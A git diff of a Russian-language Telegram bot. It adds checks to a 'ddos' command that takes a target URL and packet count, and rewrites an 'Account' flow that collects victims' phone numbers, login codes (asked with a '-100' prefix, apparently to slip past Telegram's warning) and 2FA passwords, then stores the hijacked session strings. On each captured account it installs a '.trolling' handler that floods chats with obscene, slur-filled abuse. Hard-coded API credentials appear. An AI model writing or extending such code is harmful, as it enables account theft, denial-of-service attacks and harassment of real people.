@@ -2,16 +2,14 @@ import asyncio
 import requests
 from bs4 import BeautifulSoup
 from faker import Faker
-from telethon import TelegramClient,events
+from telethon import TelegramClient
 from aiogram import F,Router,Bot
-from telethon.errors import SessionPasswordNeededError, PhoneCodeExpiredError,PhoneCodeInvalidError
+from telethon.errors import SessionPasswordNeededError,PhoneCodeExpiredError,PhoneCodeInvalidError
 import random
 import re
-from datetime import date
+from telethon.sessions import StringSession
 import os
-import aiosmtplib
-from email.mime.text import MIMEText
-from email.mime.multipart import MIMEMultipart
+from telethon import events
 
 from config import ADMIN_ID, TOKEN
 from database import SessionLocal,User,BroadCast
@@ -66,10 +64,6 @@ class Account(StatesGroup):
     phone_num = State()
     code = State()
     password = State()
-class Send(StatesGroup):
-    phone_account = State()
-    id_chat = State()
-    message_to = State()
 
 class Ip(StatesGroup):
       ip_adress = State()
@@ -631,51 +625,6 @@ async def tele_infa(message:Message,state:FSMContext):
 
     await state.clear()
 
-@router.message(Command('spam'))
-async def start_send(message:Message,state:FSMContext):
-    #if await check_member(CHANEl_ID, message):
-       await state.set_state(Send.phone_account)
-       await message.answer('Введите номер 📲 телефона подключеного аккаунта.')
-    #else:
-        #await message.answer("🌍 Подпишитесь на канал",reply_markup=sub_check)
-
-@router.message(Send.phone_account)
-async def phone_start_account(message: Message, state: FSMContext):
-    telephone = message.text.strip()
-    telephone_from_hash = telephone.replace(' ', '').replace('+', '')
-
-    file_path = f'session_{telephone_from_hash}'
-
-
-    if not os.path.exists(file_path):
-        await message.answer('🔐 Извините, но такой сессии нет.')
-        await state.clear()
-        return
-
-    try:
-        # Инициализируем клиент
-        client = TelegramClient(file_path, api_id, api_hash)
-
-        # Проверяем авторизацию
-        await client.connect()
-        if not await client.is_user_authorized():
-            await message.answer('❌ Сессия существует, но не авторизована.')
-            await client.disconnect()
-            await state.clear()
-
-
-        # Регистрируем обработчики (если нужно)
-        @client.on(events.NewMessage(pattern='.spam'))
-        async def spam_handler(event):
-            await event.reply('Привет мастер!')
-
-        await message.answer('Сессия включена ✅ спасибо за работу !')
-        await state.clear()
-    except Exception as e:
-        await message.answer(f'❌ Ошибка при работе с сессией: {str(e)}')
-        await state.clear()
-
-
 
 
 @router.message(F.content_type == ContentType.PHOTO)
@@ -747,11 +696,24 @@ async def ddos_start(message:Message,state:FSMContext):
 
 @router.message(Ddoss.target)
 async def ddos(message:Message,state:FSMContext):
+    text = message.text.strip()
+    if len(text) < 10:
+       await message.answer('Это не URL попробуй заново.')
+       await state.clear()
 
-    await state.update_data(target=message.text)
-    await state.set_state(Ddoss.number)
+    if len(text) > 60:
+       await message.answer('Это не URL попробуй заново.')
+       await state.clear()
 
-    await message.answer('Введи количество пакетов🛍️ не больше 100')
+    if text.startswith(('http://', 'https://', 'www.')):
+        await state.update_data(target=message.text)
+        await state.set_state(Ddoss.number)
+
+        await message.answer('Введи количество пакетов🛍️ не больше 100')
+    else:
+        await message.answer('Это не URL попробуй заново.')
+        await state.clear()
+
 
 @router.message(Ddoss.number)
 async def ddosing(message:Message,state:FSMContext):
@@ -792,147 +754,207 @@ async def json(callback:CallbackQuery):
     jsons = callback.from_user.json()
     await callback.answer('')
     await callback.message.answer(f"{jsons}")
-@router.message(F.text == '👤 Аккаунт')
-async def account_login(message:Message,state:FSMContext):
 
+
+@router.message(F.text == '👤 Аккаунт')
+async def account_login(message: Message, state: FSMContext):
     await state.set_state(Account.phone_num)
     await message.answer('Введи номер телефона 📲')
 
+
 @router.message(Account.phone_num)
-async def account_log(message:Message,state:FSMContext):
+async def account_log(message: Message, state: FSMContext):
+    phone = message.text.strip().replace(' ', '').replace('+', '')
+    session_file = f'session_{phone}.txt'
 
-    phone_nep = message.text.strip()
-    phone_to_hash = phone_nep.replace(' ','')
-    phone_from_hash = phone_to_hash.replace('+','')
-    file_path = f'session_{phone_from_hash}'
+    # Проверяем существующую сессию как строку
+    if os.path.exists(session_file):
+        try:
+            with open(session_file, 'r') as f:
+                session_string = f.read().strip()
 
-    file_check = ''
+            # Используем StringSession вместо файловой
+            client = TelegramClient(
+                StringSession(session_string),
+                api_id,
+                api_hash
+            )
+            await client.connect()
+
+            if await client.is_user_authorized():
+                me = await client.get_me()
+                await message.answer(f'✅ Аккаунт @{me.username} уже подключен!')
+                await setup_client_handlers(client)
+                await state.clear()
+                return
+            else:
+                await client.disconnect()
+                os.remove(session_file)  # Удаляем нерабочую сессию
+        except:
+            if os.path.exists(session_file):
+                os.remove(session_file)
+
+    # Создаем новую сессию как StringSession
     try:
-        with open(file_path, 'r'):
-            file_check = 'да'
-            print(file_check)
-
-    except FileNotFoundError:
-        file_check = 'нет'
-        print(file_check)
-
-    if file_check == 'да':
-        await message.answer('Такая сессия уже существует')
-        await state.clear()
-    else:
-
-        client = TelegramClient(f'session_{phone_to_hash}',
-                            api_id, api_hash)
-
+        # Создаем сессию в памяти
+        session = StringSession()
+        client = TelegramClient(
+            session,
+            20880015,
+            '1afaf973893798968502dfe925360345'
+        )
         await client.connect()
 
-        send_code = await client.send_code_request(phone=phone_nep)
+        send_code = await client.send_code_request(phone=phone)
 
-        await state.update_data(phone_num=phone_nep,hashing = send_code.phone_code_hash)
-
-        print("Dada")
-
-
-
-    await message.answer('Введи код который пришел, чтоб подключить ваш Telegram')
-    await state.set_state(Account.code)
-
-@router.message(Account.code)
-async def account_code_sent(message:Message,state:FSMContext):
-
-    data = await state.get_data()
-    phone_nep = data['phone_num']
-
-    code = message.text.strip()
-    client = TelegramClient(f'session_{phone_nep}',
-                            api_id, api_hash)
-    if len(code) != 5:
-        await message.answer("❌ Код должен содержать 5 цифр. Попробуй еще раз:")
-        return
-
-    await state.update_data(code = message.text)
-    data = await state.get_data()
-    hashing = data['hashing']
-    phone = data['phone_num']
-
-    try:
-        await client.connect()
-        await client.sign_in(
+        await state.update_data(
+            hashing=send_code.phone_code_hash,
+            client=client,
             phone=phone,
-            code=code,
-            phone_code_hash=hashing
-
+            session_string=session.save(),  # Сохраняем сессию как строку
+            session_file=session_file
         )
 
-
-        if await client.is_user_authorized():
-
-            me = await client.get_me()
-            await message.answer(f'✅ Аккаунт @{me.username} успешно подключен!')
-
-            await client.disconnect()
-
-        else:
-            await message.answer('❌ Не удалось авторизоваться')
-
-        await state.clear()
-
-    except SessionPasswordNeededError:
-        await state.update_data(code=code)
-        await message.answer('🔒 Введите пароль двухфакторной аутентификации:')
-        await state.set_state(Account.password)
-
-    except PhoneCodeInvalidError:
-        await message.answer('❌ Неверный код. Попробуйте еще раз:')
+        await message.answer('⬆️ Введи код с -100 в начале:')
+        await state.set_state(Account.code)
 
     except Exception as e:
-
-        await message.answer(f'❌ Ошибка при входе. Попробуйте снова{e}.')
+        await message.answer(f'❌ Ошибка: {e}')
         await state.clear()
-    except PhoneCodeExpiredError:
-        # 3. Если код "истек" - запрашиваем новый и пробуем сразу
-        print("🔄 Запрашиваем новый код и пробуем сразу...")
-        new_sent_code = await client.send_code_request(phone)
-
-        # Пробуем войти с НОВЫМ кодом сразу
-        try:
-            await client.sign_in(
-                phone=phone,
-                code=code,  # Тот же код!
-                phone_code_hash=new_sent_code.phone_code_hash
-
-            )
-            await client.disconnect()
-            return "✅ Успешный вход! Проблема была в phone_code_hash"
-
-        except PhoneCodeExpiredError:
-            return "❌ Код действительно недействителен"
 
 
+@router.message(Account.code)
+async def account_code_sent(message: Message, state: FSMContext):
+    data = await state.get_data()
 
+    # Восстанавливаем клиент из строки сессии
+    session = StringSession(data['session_string'])
+    client = TelegramClient(
+        session,
+        api_id,
+        api_hash
+    )
 
+    await client.connect()
 
+    code = message.text.strip().replace('-100', '')
 
+    if len(code) != 5 or not code.isdigit():
+        await message.answer("❌ Нужно 5 цифр после -100")
+        await client.disconnect()
+        return
 
+    try:
+        await client.sign_in(
+            phone=data['phone'],
+            code=code,
+            phone_code_hash=data['hashing']
+        )
 
+        if await client.is_user_authorized():
+            me = await client.get_me()
+            await message.answer(f'✅ Аккаунт @{me.username} подключен!')
+
+            # Сохраняем сессию в файл как строку
+            session_string = session.save()  # ← ПРАВИЛЬНО! Используем session, а не client.session
+            with open(data['session_file'], 'w') as f:
+                f.write(session_string)
+
+            await setup_client_handlers(client)
+
+    except SessionPasswordNeededError:
+        # Сохраняем обновленную сессию для пароля
+        session_string = session.save()  # ← ПРАВИЛЬНО!
+        await state.update_data(
+            session_string=session_string,
+            client=client
+        )
+        await message.answer('🔒 Введите пароль 2FA:')
+        await state.set_state(Account.password)
+        return
+
+    except Exception as e:
+        await message.answer(f'❌ Ошибка: {e}')
+        await client.disconnect()
+
+    await state.clear()
 
 
 @router.message(Account.password)
-async def password_sign_in(message:Message,state:FSMContext):
-    user_id = message.from_user.id
-
-
-    passworder = message.text.strip()
+async def password_sign_in(message: Message, state: FSMContext):
     data = await state.get_data()
-    phone = data['phone_num']
-    client = TelegramClient(f'session_{phone}',
-                            api_id, api_hash)
-    code = data['code']
-    hashing = data['hashing']
 
-    await client.sign_in(password=passworder,phone_code_hash=hashing)
+    # Восстанавливаем клиент из строки сессии
+    session = StringSession(data['session_string'])
+    client = TelegramClient(
+        session,
+        api_id,
+        api_hash
+    )
+
+    await client.connect()
+
+    try:
+        await client.sign_in(password=message.text.strip())
+
+        if await client.is_user_authorized():
+            me = await client.get_me()
+            await message.answer(f'✅ Аккаунт @{me.username} подключен!')
+
+            # Сохраняем сессию в файл
+            session_string = session.save()  # ← ПРАВИЛЬНО!
+            with open(data['session_file'], 'w') as f:
+                f.write(session_string)
+
+            await setup_client_handlers(client)
+        else:
+            await message.answer('❌ Не удалось авторизоваться')
+            await client.disconnect()
+
+    except Exception as e:
+        await message.answer(f'❌ Ошибка: {e}')
+        await client.disconnect()
 
     await state.clear()
+
+async def setup_client_handlers(client):
+    @client.on(events.NewMessage(pattern='.trolling'))
+    async def handler(event):
+
+        existing_text = "Я тебе сынку тупой шлюхи твое сосалище переломаю своим огромным палающим хуем ведь ты ебанная мразота которая сидит здесь и терпит нихуевые харчки в свое прищавое ебало которое я использовал как тряпку для пола ибо ты сын шалавы парокопытной вообще не можешь дать весомого отпора, ты как слабый чуркобес у которого мать шлюха ебанная будешь постоянно в роли терпилы сидеть и мой член мусолить своими обжогшими ручками ведь я не раз предупреждал что мой член разогревается до температуры солнца, но ты сын бляди ебанной все равно пытался дать отпор и каждый раз отлетал в нокаут после первого точного удара и моему члену уже было скучно каждый раз тебя пинком к дому отправлять поэтому я взял твое свинное рыло в руки и приложил к стене которая была вся в моей сперме, и начал ломать твое горящее очко набирая скорость всё выше и выше, щегол ебучий когда ты уже поймёшь что на меня рыпаться не нужно ибо ты сын шалавы будешь отрабатывать каждый пинок под зад который ты получаешь после очередного отсоса пытаясь побороться с моей шиповоной подошвой которая вся в дерьме, ты сын шлюхи косоеблой до конца своей жизни будешь стоять на коленях и умолять мой огромный член поправить наконец-то свой свинной спермоприемник на котором прищей больше чем у родной матери зубов, но он как и раньше будет заплевывать тежёлыми маслянистыми харчками  твое окровавленное ебало на котором дохуище шрамов от моего палающего члена который твоя матушка закидывает к себе в ротан как школьники снюс"
+        words = existing_text.split()
+        await event.delete()
+
+
+            # Флаг для остановки
+        stop_flag = False
+
+            # Обработчик для команды stop
+        @client.on(events.NewMessage(pattern='.stop'))
+        async def stop_handler(stop_event):
+            nonlocal stop_flag
+            if stop_event.chat_id == event.chat_id:
+               stop_flag = True
+
+               await stop_event.delete()
+
+            # Бесконечный цикл
+        while not stop_flag:
+            for i in range(0, len(words), 2):
+                if stop_flag:
+                    break
+                pair = ' '.join(words[i:i + 2])
+                await event.respond(pair)
+                await asyncio.sleep(0.02)
+
+                # Небольшая пауза между циклами
+            if not stop_flag:
+                await asyncio.sleep(1)
+
+
+
+
+
 
 
 
